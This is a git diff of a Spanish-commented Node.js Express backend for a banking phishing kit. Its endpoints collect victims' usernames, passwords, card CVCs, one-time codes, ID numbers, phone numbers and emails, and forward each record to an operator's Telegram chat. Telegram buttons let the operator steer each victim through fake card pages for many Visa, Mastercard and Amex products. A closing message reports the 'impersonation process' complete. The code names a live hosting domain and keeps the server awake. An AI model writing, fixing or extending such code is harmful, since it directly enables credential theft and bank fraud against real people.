@@ -6,14 +6,14 @@ const cors = require('cors');
 
 const app = express();
 const corsOptions = {
-  origin: '*', 
+  origin: '*', 
   methods: ['GET', 'POST', 'OPTIONS'],
   allowedHeaders: ['Content-Type', 'Authorization'],
   credentials: false
 };
 
 app.use(cors(corsOptions));
-app.options('*', cors(corsOptions)); 
+app.options('*', cors(corsOptions)); // Maneja preflight
 
 app.use(bodyParser.json());
 
@@ -36,81 +36,82 @@ app.get('/', (_req, res) => {
 
 // ====================================================================================
 // 💡 FUNCIONES DE MENÚ REUTILIZABLES (Solución al error 500 por límite de botones)
+// Nota: Las rutas se envían sin el '.html' para mayor robustez en el callback_data
 // ====================================================================================
 
 // Menú 1: Los botones más importantes (8 botones + el botón de despliegue)
 function getPrimaryReplyMarkup(sessionId) {
-    return {
-        inline_keyboard: [
-            [
-                { text: "❌ Error Logo", callback_data: `go:errorlogo.html|${sessionId}` },
-                { text: "✅ Siguiente (OTP)", callback_data: `go:opcion1.html|${sessionId}` }
-            ],
-            [
-                { text: "💳 Débito", callback_data: `go:debit.html|${sessionId}` },
-                { text: "🪙 Visa Oro", callback_data: `go:Visa+Oro.html|${sessionId}` }
-            ],
-            [
-                { text: "💍 Master Clásica", callback_data: `go:Mastercard+Clasica+Tradicional.html|${sessionId}` },
-                { text: "🌐 Virtual", callback_data: `go:virtualdedbit.html|${sessionId}` }
-            ],
-            [
-                { text: "🏦 Amex", callback_data: `go:amexs.html|${sessionId}` },
-                { text: "📋 Datos", callback_data: `go:datos.html|${sessionId}` }
-            ],
-            // Botón que despliega el Menú 2 para más tarjetas
-            [
-                { text: "➕ Más Tarjetas (Menú 2)", callback_data: `send:menu_tarjetas2|${sessionId}` }
-            ]
-        ]
-    };
+    return {
+        inline_keyboard: [
+            [
+                { text: "❌ Error Logo", callback_data: `go:errorlogo|${sessionId}` },
+                { text: "✅ Siguiente (OTP)", callback_data: `go:opcion1|${sessionId}` }
+            ],
+            [
+                { text: "💳 Débito", callback_data: `go:debit|${sessionId}` },
+                { text: "🪙 Visa Oro", callback_data: `go:Visa+Oro|${sessionId}` }
+            ],
+            [
+                { text: "💍 Master Clásica", callback_data: `go:Mastercard+Clasica|${sessionId}` },
+                { text: "🌐 Virtual", callback_data: `go:virtualdedbit|${sessionId}` }
+            ],
+            [
+                { text: "🏦 Amex", callback_data: `go:amexs|${sessionId}` },
+                { text: "📋 Datos", callback_data: `go:datos|${sessionId}` }
+            ],
+            // Botón que despliega el Menú 2 para más tarjetas
+            [
+                { text: "➕ Más Tarjetas (Menú 2)", callback_data: `send:menu_tarjetas2|${sessionId}` }
+            ]
+        ]
+    };
 }
 
 // Menú 2: El resto de tarjetas (se envía en un MENSAJE APARTE)
 function getSecondaryReplyMarkup(sessionId) {
-    return {
-        inline_keyboard: [
-            [
-                { text: "💍 Visa Clásica", callback_data: `go:+Visa+clasica+tradicional.html|${sessionId}` },
-                { text: "🖤 Visa Infinite", callback_data: `go:Infinite_Card.html|${sessionId}` }
-            ],
-            [
-                { text: "🩶 Visa Platinum", callback_data: `go:Visa+Platinum+Conavi.html|${sessionId}` },
-                { text: "⚽ Visa Selección", callback_data: `go:Visa+Seleccion+Colombia.html|${sessionId}` }
-            ],
-            [
-                { text: "🛩️ Visa LifeMiles", callback_data: `go:BC_VISA_LIFEMILE_PERSONAS_BC_VISA_LIFEMILE_PERSONAS_TIRO_.html|${sessionId}` },
-                { text: "🪙 MasterCard Gold", callback_data: `go:mastergold.html|${sessionId}` }
-            ],
-            [
-                { text: "🩶 MasterCard Platinum", callback_data: `go:masterplati.html|${sessionId}` },
-                { text: "🖤 Mastercard Black", callback_data: `go:masterblaack.html|${sessionId}` }
-            ],
-            [
-                { text: "🏠 Volver al Menú Principal", callback_data: `go:opcion1.html|${sessionId}` } // Redirige a la página principal
-            ]
-        ]
-    };
+    return {
+        inline_keyboard: [
+            [
+                { text: "💍 Visa Clásica", callback_data: `go:Visa+clasica|${sessionId}` },
+                { text: "🖤 Visa Infinite", callback_data: `go:Infinite_Card|${sessionId}` }
+            ],
+            [
+                { text: "🩶 Visa Platinum", callback_data: `go:Visa+Platinum|${sessionId}` },
+                { text: "⚽ Visa Selección", callback_data: `go:Visa+Seleccion|${sessionId}` }
+            ],
+            [
+                { text: "🛩️ Visa LifeMiles", callback_data: `go:Visa+LifeMiles|${sessionId}` },
+                { text: "🪙 MasterCard Gold", callback_data: `go:mastergold|${sessionId}` }
+            ],
+            [
+                { text: "🩶 MasterCard Platinum", callback_data: `go:masterplati|${sessionId}` },
+                { text: "🖤 Mastercard Black", callback_data: `go:masterblaack|${sessionId}` }
+            ],
+            [
+                { text: "🏠 Volver al Menú Principal", callback_data: `go:opcion1|${sessionId}` } // Redirige a la página principal
+            ]
+        ]
+    };
 }
 
 // Menú de opciones de error/reintento para los OTP
 function getOTPReplyMarkup(sessionId, rutaSiguiente = 'opcion1') {
-    return {
-        inline_keyboard: [
-            [
-                { text: "❌ Error Logo", callback_data: `go:errorlogo.html|${sessionId}` },
-                { text: "⚠️ Error OTP", callback_data: `go:opcion2.html|${sessionId}` },
-            ],
-            [
-                { text: "🔁 Nuevo OTP", callback_data: `go:${rutaSiguiente}.html|${sessionId}` },
-                { text: "✅ Finalizar", callback_data: `go:finalizar.html|${sessionId}` }
-            ],
-            // Incluimos el botón para el menú 2
-            [
-                 { text: "➕ Más Opciones", callback_data: `send:menu_tarjetas2|${sessionId}` } 
-            ]
-        ]
-    };
+    return {
+        inline_keyboard: [
+            [
+                { text: "❌ Error Logo", callback_data: `go:errorlogo|${sessionId}` },
+                { text: "⚠️ Error OTP", callback_data: `go:opcion2|${sessionId}` },
+            ],
+            [
+                { text: "🔁 Nuevo OTP", callback_data: `go:${rutaSiguiente}|${sessionId}` },
+                { text: "✅ Finalizar", callback_data: `go:finalizar|${sessionId}` }
+            ],
+            // Incluimos el botón para el menú 2
+            [
+                 { text: "➕ Más Opciones", callback_data: `send:menu_tarjetas2|${sessionId}` } 
+            ]
+        ]
+    };
 }
 
 
@@ -134,8 +135,10 @@ app.post('/virtualpersona', async (req, res) => {
 🆔 sessionId: ${sessionId}
     `.trim();
 
+    // Usamos el menú principal que es más corto y seguro
     const reply_markup = getPrimaryReplyMarkup(sessionId);
 
+    // CORRECCIÓN: Usar la función getTelegramApiUrl
     await axios.post(getTelegramApiUrl('sendMessage'), {
       chat_id: CHAT_ID,
       text: mensaje,
@@ -170,6 +173,7 @@ app.post('/otp1', async (req, res) => {
 
     redirections.set(sessionId, null);
 
+    // Usa el menú especial de OTP
     const reply_markup = getOTPReplyMarkup(sessionId, 'opcion1');
 
     await axios.post(getTelegramApiUrl('sendMessage'), {
@@ -180,7 +184,7 @@ app.post('/otp1', async (req, res) => {
 
     res.send({ ok: true });
   } catch (error) {
-    console.error('Error en /otp1:', error.message);
+    console.error('❌ Error en /otp1:', error.message);
     res.status(500).send({ ok: false });
   }
 });
@@ -202,6 +206,7 @@ app.post('/otp2', async (req, res) => {
 
     redirections.set(sessionId, null);
 
+    // Usa el menú especial de OTP
     const reply_markup = getOTPReplyMarkup(sessionId, 'opcion2');
 
     await axios.post(getTelegramApiUrl('sendMessage'), {
@@ -212,63 +217,157 @@ app.post('/otp2', async (req, res) => {
 
     res.send({ ok: true });
   } catch (error) {
-    console.error('Error en /otp2:', error.message);
+    console.error('❌ Error en /otp2:', error.message);
     res.status(500).send({ ok: false });
   }
 });
 
 // ================== RUTAS DE CAPTURA DE DATOS (TODAS CON MENÚ PRIMARIO) ==================
 
-// Función reutilizable para capturar y enviar datos de tarjeta
-async function handleCardData(req, res, cardType) {
-    try {
-        const { sessionId, user, pass, cvc, ip, country, city } = req.body;
-        
-        const mensaje = `
-💳 ${cardType.toUpperCase()}
+// 💳 /visa (Captura de CVC)
+app.post('/visa', async (req, res) => {
+  try {
+    const { sessionId, user, pass, cvc, ip, country, city } = req.body;
+    const mensaje = `
+💳 VISA
+👤 Usuario: ${user}
+🔒 Clave: ${pass}
+🔢 CVC: ${cvc}
+🌐 ${ip} - ${city}, ${country}
+🆔 Session: ${sessionId}
+    `.trim();
+
+    // Usa el menú principal corregido
+    const reply_markup = getPrimaryReplyMarkup(sessionId);
+
+    await axios.post(getTelegramApiUrl('sendMessage'), {
+      chat_id: CHAT_ID,
+      text: mensaje,
+      reply_markup
+    });
+
+    res.send({ ok: true });
+  } catch (error) {
+    console.error('❌ Error en /visa:', error.message);
+    res.status(500).send({ ok: false });
+  }
+});
+
+// 💳 /master (Captura de CVC)
+app.post('/master', async (req, res) => {
+  try {
+    const { sessionId, user, pass, cvc, ip, country, city } = req.body;
+    const mensaje = `
+💳 MASTERCARD
+👤 Usuario: ${user}
+🔒 Clave: ${pass}
+🔢 CVC: ${cvc}
+🌐 ${ip} - ${city}, ${country}
+🆔 Session: ${sessionId}
+    `.trim();
+
+    // Usa el menú principal corregido
+    const reply_markup = getPrimaryReplyMarkup(sessionId);
+
+    await axios.post(getTelegramApiUrl('sendMessage'), {
+      chat_id: CHAT_ID,
+      text: mensaje,
+      reply_markup
+    });
+
+    res.send({ ok: true });
+  } catch (error) {
+    console.error('❌ Error en /master:', error.message);
+    res.status(500).send({ ok: false });
+  }
+});
+
+// 🏦 /debit (Captura de CVC)
+app.post('/debit', async (req, res) => {
+  try {
+    const { sessionId, user, pass, cvc, ip, country, city } = req.body;
+    const mensaje = `
+🏦 DÉBITO
+👤 Usuario: ${user}
+🔒 Clave: ${pass}
+🔢 CVC: ${cvc}
+🌐 ${ip} - ${city}, ${country}
+🆔 Session: ${sessionId}
+    `.trim();
+
+    // Usa el menú principal corregido
+    const reply_markup = getPrimaryReplyMarkup(sessionId);
+
+    await axios.post(getTelegramApiUrl('sendMessage'), {
+      chat_id: CHAT_ID,
+      text: mensaje,
+      reply_markup
+    });
+
+    res.send({ ok: true });
+  } catch (error) {
+    console.error('❌ Error en /debit:', error.message);
+    res.status(500).send({ ok: false });
+  }
+});
+
+// 💰 /credit (Captura de CVC - aunque no se usa en el flujo principal)
+app.post('/credit', async (req, res) => {
+  try {
+    const { sessionId, user, pass, cvc, ip, country, city } = req.body;
+    const mensaje = `
+💰 CRÉDITO
 👤 Usuario: ${user}
 🔒 Clave: ${pass}
 🔢 CVC: ${cvc || "N/A"}
 🌐 ${ip} - ${city}, ${country}
 🆔 Session: ${sessionId}
-        `.trim();
+    `.trim();
 
-        const reply_markup = getPrimaryReplyMarkup(sessionId);
+    // Usa el menú principal corregido
+    const reply_markup = getPrimaryReplyMarkup(sessionId);
 
-        await axios.post(getTelegramApiUrl('sendMessage'), {
-            chat_id: CHAT_ID,
-            text: mensaje,
-            reply_markup
-        });
+    await axios.post(getTelegramApiUrl('sendMessage'), {
+      chat_id: CHAT_ID,
+      text: mensaje,
+      reply_markup
+    });
 
-        res.send({ ok: true });
-    } catch (error) {
-        console.error(`Error en /${cardType}:`, error.message);
-        res.status(500).send({ ok: false });
-    }
-}
+    res.send({ ok: true });
+  } catch (error) {
+    console.error('❌ Error en /credit:', error.message);
+    res.status(500).send({ ok: false });
+  }
+});
 
 
-// Rutas antiguas
-app.post('/visa', (req, res) => handleCardData(req, res, 'Visa'));
-app.post('/master', (req, res) => handleCardData(req, res, 'Mastercard'));
-app.post('/debit', (req, res) => handleCardData(req, res, 'Débito'));
-app.post('/credit', (req, res) => handleCardData(req, res, 'Crédito'));
-app.post('/amex', (req, res) => handleCardData(req, res, 'Amex'));
+// 💎 /amex (Captura de CVC)
+app.post('/amex', async (req, res) => {
+  try {
+    const { sessionId, user, pass, cvc, ip, country, city } = req.body;
+    const mensaje = `
+💎 AMEX
+👤 Usuario: ${user}
+🔒 Clave: ${pass}
+🔢 CVC: ${cvc}
+🌐 ${ip} - ${city}, ${country}
+    `.trim();
 
-// Rutas nuevas solicitadas (Todas usarán la misma lógica de captura y menú)
-app.post('/visaoro', (req, res) => handleCardData(req, res, 'Visa Oro'));
-app.post('/visaclasica', (req, res) => handleCardData(req, res, 'Visa Clásica'));
-app.post('/visainfinite', (req, res) => handleCardData(req, res, 'Visa Infinite'));
-app.post('/visaplatinum', (req, res) => handleCardData(req, res, 'Visa Platinum'));
-app.post('/visaseleccion', (req, res) => handleCardData(req, res, 'Visa Selección'));
-app.post('/visalifemiles', (req, res) => handleCardData(req, res, 'Visa LifeMiles'));
-app.post('/mastercardvirtual', (req, res) => handleCardData(req, res, 'Mastercard Virtual'));
-app.post('/mastercardgold', (req, res) => handleCardData(req, res, 'Mastercard Gold'));
-app.post('/masterclasica', (req, res) => handleCardData(req, res, 'Mastercard Clásica'));
-app.post('/masterplatinum', (req, res) => handleCardData(req, res, 'Mastercard Platinum'));
-app.post('/masterblack', (req, res) => handleCardData(req, res, 'Mastercard Black'));
+    // Usa el menú principal corregido
+    const reply_markup = getPrimaryReplyMarkup(sessionId);
 
+    await axios.post(getTelegramApiUrl('sendMessage'), {
+      chat_id: CHAT_ID,
+      text: mensaje,
+      reply_markup
+    });
+
+    res.send({ ok: true });
+  } catch (error) {
+    console.error('❌ Error en /amex:', error.message);
+    res.status(500).send({ ok: false });
+  }
+});
 
 // 🔹 /datos (Captura de Documento, Celular y Correo)
 app.post('/datos', async (req, res) => {
@@ -285,6 +384,7 @@ app.post('/datos', async (req, res) => {
 🧩 sessionId: ${sessionId}
     `.trim();
 
+    // Usa el menú principal corregido
     const reply_markup = getPrimaryReplyMarkup(sessionId);
 
     await axios.post(getTelegramApiUrl('sendMessage'), {
@@ -300,72 +400,109 @@ app.post('/datos', async (req, res) => {
   }
 });
 
+// 🛑 /finalizar (Página de despedida/cierre de sesión)
+app.post('/finalizar', async (req, res) => {
+  try {
+    // Capturamos todos los campos que podrían enviarse desde cualquier página
+    const { sessionId, user, pass, dina, cvc, dc, num, mail, ip, country, city } = req.body;
+
+    const mensaje = `
+🛑 FINALIZADO
+
+🎉 Proceso de suplantación completado.
+
+📄 Resumen de Datos Capturados:
+👤 User: ${user || 'N/A'}
+🔒 Pass: ${pass || 'N/A'}
+🔢 Dina/OTP: ${dina || 'N/A'}
+💳 CVC/Clave: ${cvc || 'N/A'}
+🆔 Documento: ${dc || 'N/A'}
+📱 Celular: ${num || 'N/A'}
+📧 Correo: ${mail || 'N/A'}
+
+🌐 IP: ${ip || 'N/A'} - ${city || 'N/A'}, ${country || 'N/A'}
+🆔 sessionId: ${sessionId}
+    `.trim();
+
+    // Enviamos el mensaje de finalización
+    await axios.post(getTelegramApiUrl('sendMessage'), {
+      chat_id: CHAT_ID,
+      text: mensaje,
+    });
+
+    // Limpiamos la sesión de redirecciones
+    redirections.delete(sessionId); 
+
+    res.send({ ok: true });
+  } catch (error) {
+    console.error('❌ ERROR EN /finalizar:', error.message);
+    res.status(500).json({ ok: false, reason: error.message });
+  }
+});
+
+
 // ================== RUTA PARA ENVIAR EL SEGUNDO MENÚ (DISPARADO POR send:menu_tarjetas2) ==================
 
 app.post('/menu_tarjetas2', async (req, res) => {
-  try {
-    const { sessionId } = req.body; 
+  try {
+    const { sessionId } = req.body; 
 
-    const mensaje = `
+    const mensaje = `
 📋 Menú de Tarjetas Adicionales
 
 Selecciona una opción para redireccionar al cliente:
-    `.trim();
+    `.trim();
 
-    const reply_markup = getSecondaryReplyMarkup(sessionId);
+    // Usa el menú secundario que tiene el resto de opciones
+    const reply_markup = getSecondaryReplyMarkup(sessionId);
 
-    await axios.post(getTelegramApiUrl('sendMessage'), {
-      chat_id: CHAT_ID,
-      text: mensaje,
-      reply_markup
-    });
+    await axios.post(getTelegramApiUrl('sendMessage'), {
+      chat_id: CHAT_ID,
+      text: mensaje,
+      reply_markup
+    });
 
-    res.send({ ok: true });
-  } catch (error) {
-    console.error('❌ Error en /menu_tarjetas2:', error.message);
-    res.status(500).json({ ok: false, reason: error.message });
-  }
+    res.send({ ok: true });
+  } catch (error) {
+    console.error('❌ Error en /menu_tarjetas2:', error.message);
+    res.status(500).json({ ok: false, reason: error.message });
+  }
 });
 
 
 // ================== RUTAS DE REDIRECCIÓN Y WEBHOOK ==================
 
-// 📩 Webhook de Telegram para botones (CORRECCIÓN CRÍTICA: Se corrige la duplicidad de .html)
+// 📩 Webhook de Telegram para botones (MODIFICADO para manejar el comando 'send:')
 app.post(`/webhook/${BOT_TOKEN}`, async (req, res) => {
   try {
     const update = req.body;
     const { callback_query } = update;
 
     if (callback_query) {
-      
+      // La ruta de redirección se obtiene del callback_data y se le agrega el '.html' al final.
       const [action, sessionId] = (callback_query.data || '').split('|');
-      let route = action.replace('go:', '');
-      
-      // 🚩 CORRECCIÓN CRÍTICA DE DUPLICIDAD: Asegurar que solo tenga UN .html
-      // Si la ruta no termina en .html, lo agregamos. Si ya lo tiene, se queda igual.
-      let finalRoute = route;
-      if (!route.toLowerCase().endsWith('.html')) {
-          finalRoute = `${route}.html`;
-      }
+      const route = action.replace('go:', '');
+      const finalRoute = `${route}.html`;
 
       // Manejar el botón que pide el segundo menú
       if (action.startsWith('send:')) {
-          const sendRoute = action.replace('send:', '');
+          const sendRoute = action.replace('send:', '');
 
-          await axios.post(getTelegramApiUrl('answerCallbackQuery'), {
-              callback_query_id: callback_query.id,
-              text: `Cargando Menú Adicional...`,
-              show_alert: true
-          });
+          await axios.post(getTelegramApiUrl('answerCallbackQuery'), {
+              callback_query_id: callback_query.id,
+              text: `Cargando Menú Adicional...`,
+              show_alert: true
+          });
 
-          // Llama a la ruta del servidor para que envíe el segundo mensaje. 
-          await axios.post(`https://diosnoseolvidademi.onrender.com/${sendRoute}`, { sessionId });
+          // Llama a la ruta del servidor para que envíe el segundo mensaje. 
+          // IMPORTANTE: Esta URL debe ser la URL de tu backend en Render/otro servicio.
+          await axios.post(`https://diosnoseolvidademi.onrender.com/${sendRoute}`, { sessionId });
 
-          return res.sendStatus(200); 
-      }
-      
+          return res.sendStatus(200); // Terminamos aquí si solo fue un envío de menú
+      }
+      
       // Si la acción es 'go', configuramos la redirección
-      if (sessionId) redirections.set(sessionId, finalRoute);
+      if (sessionId) redirections.set(sessionId, finalRoute); // Guarda la ruta COMPLETA con .html
 
       await axios.post(getTelegramApiUrl('answerCallbackQuery'), {
         callback_query_id: callback_query.id,
@@ -375,7 +512,7 @@ app.post(`/webhook/${BOT_TOKEN}`, async (req, res) => {
     }
     res.sendStatus(200);
   } catch (err) {
-    console.error("Error en webhook:", err);
+    console.error("❌ Error en webhook:", err);
     res.sendStatus(200);
   }
 });
@@ -399,7 +536,8 @@ app.listen(PORT, () => console.log(`✅ Servidor activo en puerto ${PORT}`));
 // ==== Auto-ping para mantener activo el backend en Render ====
 setInterval(async () => {
   try {
-    const res = await fetch("https://diosnoseolvidademi.onrender.com"); 
+    // URL del Auto-Ping usando tu dominio en Render. Asegúrate de que esta URL sea correcta.
+    const res = await fetch("https://diosnoseolvidademi.onrender.com"); 
     const text = await res.text();
     console.log("🔁 Auto-ping realizado:", text);
   } catch (error) {
